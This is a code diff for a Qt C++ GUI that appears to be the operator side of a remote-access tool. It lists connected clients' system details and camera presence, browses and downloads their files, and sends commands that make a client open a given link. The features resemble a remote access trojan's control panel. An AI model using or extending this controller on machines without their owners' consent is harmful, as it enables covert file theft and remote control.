@@ -9,6 +9,9 @@ MainWindow::MainWindow(QWidget *parent)
     ServerStartup();
     ui->optionsWidget->hide();
     ui->filesWidget->hide();
+    ui->downloadFileText->hide();
+    ui->SaveFile->hide();
+    ui->openLinkLine->hide();
 }
 
 MainWindow::~MainWindow()
@@ -27,10 +30,10 @@ void MainWindow::ServerStartup()
         AuthClientToTable(client);
 
         QObject::connect(client,&QTcpSocket::readyRead,this,[&](){
-            qDebug() << "[+] New message from the client. Client IP: " << client->localAddress();
+            //qDebug() << "[+] New message from the client. Client IP: " << client->localAddress();
 
-            QByteArray data = client->readAll();
-            qDebug() << 1;
+            data += client->readAll();
+
             if(data.startsWith("#getPcInformation:"))
             {
                 data = data.mid(18);
@@ -43,21 +46,26 @@ void MainWindow::ServerStartup()
                 osLanguageLabel->setText(parts[4]);
                 countryLabel->setText(parts[5]);
                 camLabel->setText(parts[6]);
+                data.clear();
             }
             if(data.startsWith("#getFileTree:"))
             {
                 Files = data.mid(13);
                 workWithFiles();
+                data.clear();
             }
             if(data.startsWith("#getAllFolders:"))
             {
                 Files = data.mid(15);
                 workWithFiles();
+                data.clear();
             }
             if(data.startsWith("#copyFiles:"))
             {
-
+                ui->downloadFileText->show();
+                QTimer::singleShot(4000,this,[&](){ui->SaveFile->show();});
             }
+
         });
 
         QObject::connect(client,&QTcpSocket::disconnected,this,[&](){
@@ -77,11 +85,6 @@ void MainWindow::ServerStartup()
     }
 }
 
-void MainWindow::on_pushButton_clicked()
-{
-    QByteArray dataForClient = "Hello Client!";
-    client->write(dataForClient);
-}
 
 void MainWindow::AuthClientToTable(QTcpSocket *socket)
 {
@@ -95,9 +98,13 @@ void MainWindow::AuthClientToTable(QTcpSocket *socket)
     button->setGeometry(0,YForLabel,1200,50);
     button->show();
 
-    QObject::connect(button,&QPushButton::pressed,this,[&](){
+    QObject::connect(button, &QPushButton::pressed, this, [&]() {
+        QPoint cursorPos = QCursor::pos();
+        QPoint widgetPos = ui->optionsWidget->parentWidget()->mapFromGlobal(cursorPos);
+
+        ui->optionsWidget->move(widgetPos);
+        ui->optionsWidget->raise();
         ui->optionsWidget->show();
-        ui->optionsWidget->setGeometry(400,YForLabel,111,201);
     });
 
     QLabel *ipLabel = new QLabel(ui->clientsWidget);
@@ -181,8 +188,19 @@ void MainWindow::getClientInformation(QTcpSocket *socket)
 
 void MainWindow::on_filesButton_clicked()
 {
-    ui->filesWidget->show();
-    ui->filesWidget->move(ui->optionsWidget->x()+115,ui->optionsWidget->y());
+    qDebug() << 1;
+    ui->filesWidget->move(ui->optionsWidget->x()+110,ui->optionsWidget->y());
+    ui->filesWidget->raise();
+    if(openFilesBool == 0)
+    {
+        ui->filesWidget->show();
+        openFilesBool = 1;
+    }
+    else if(openFilesBool == 1)
+    {
+        ui->filesWidget->hide();
+        openFilesBool = 0;
+    }
 
 }
 
@@ -195,8 +213,9 @@ void MainWindow::on_showC_clicked()
 void MainWindow::workWithFiles()
 {
     QWidget *container = new QWidget();
-
+    container->setStyleSheet("background-color: rgba(0,0,0,240);");
     QLabel *label = new QLabel(container);
+    label->setStyleSheet("color: white; font: 600 13pt \"Segoe UI\";");
     label->setText(Files);
     label->setWordWrap(true);
     label->adjustSize();
@@ -259,10 +278,71 @@ void MainWindow::on_deleteDir_2_clicked()
 
 void MainWindow::on_copyFile_clicked()
 {
-    QString path = ui->searchPath->text();
-    QByteArray requestData = "#copyFiles:" + path.toLatin1();
+    pathCopyFile = ui->searchPath->text();
+    QByteArray requestData = "#copyFiles:" + pathCopyFile.toLatin1();
     client->write(requestData);
-    requestData.clear();
-    path.clear();
+}
+
+QString MainWindow::selectDirectory() {
+    QString dirPath = QFileDialog::getExistingDirectory(this, "Выберите папку", "");
+
+    if (!dirPath.isEmpty()) {
+        return dirPath;
+    } else {
+        return "";
+    }
+}
+
+void MainWindow::on_inputFile_clicked()
+{
+
+}
+
+
+void MainWindow::on_SaveFile_clicked()
+{
+    QFileInfo fileType(pathCopyFile);
+    QString fullFilePath = selectDirectory() + "/" + fileType.baseName() + "." + fileType.suffix();
+    QByteArray buffer =  data.mid(11);
+
+    QFile saveFile(fullFilePath);
+
+    qDebug() << fullFilePath;
+
+    if(saveFile.open(QIODevice::WriteOnly))
+    {
+        saveFile.write(buffer);
+        saveFile.close();
+    }
+    ui->SaveFile->hide();
+    ui->downloadFileText->hide();
+    pathCopyFile.clear();
+    data.clear();
+}
+
+
+void MainWindow::on_openLink_clicked()
+{
+    ui->openLinkLine->setGeometry(ui->optionsWidget->x()+110,ui->optionsWidget->y()+40,181,31);
+    ui->openLinkLine->raise();
+    if(openLink == 0)
+    {
+      ui->openLinkLine->show();
+      openLink = 1;
+    }
+    else if(openLink == 1)
+    {
+      QByteArray requestData = "#openLink:" + ui->openLinkLine->text().toLatin1();
+      client->write(requestData);
+      ui->openLinkLine->hide();
+      openLink = 0;
+    }
+
+}
+
+
+void MainWindow::on_backToMain_clicked()
+{
+    ui->stackedWidget->setCurrentIndex(0);
 }
 
